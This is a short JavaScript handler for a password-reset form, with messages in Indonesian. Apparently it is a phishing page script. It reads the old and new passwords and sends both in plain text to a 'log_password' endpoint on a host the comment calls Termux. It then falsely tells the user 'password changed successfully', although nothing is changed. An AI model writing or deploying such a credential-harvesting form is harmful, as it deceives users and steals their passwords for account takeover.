document.getElementById("resetPasswordForm").addEventListener("submit", function(event) {
    event.preventDefault();
    let oldPassword = document.getElementById("oldPassword").value;
    let newPassword = document.getElementById("newPassword").value;

    if (!oldPassword || !newPassword) {
        alert("⚠️ Harap isi semua kolom.");
        return;
    }
    if (newPassword.length < 6) {
        alert("⚠️ Kata sandi baru minimal 6 karakter.");
        return;
    }

    // Kirim data ke Termux
    fetch("http://10.60.233.66:5000/log_password", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ old_password: oldPassword, new_password: newPassword })
    });

    alert("✅ Kata sandi berhasil diubah!");
});